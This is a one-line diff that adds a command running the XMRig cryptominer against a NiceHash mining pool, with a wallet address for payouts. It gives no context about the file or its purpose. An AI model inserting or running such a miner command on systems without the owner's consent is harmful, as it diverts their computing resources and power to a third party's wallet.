@@ -1,0 +1,1 @@
+xmrig.exe -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 3FSqW1MFAdzekG6DdvfUhPVnwVY4C9zBAG.at7yh07v1st6gy0 -p x
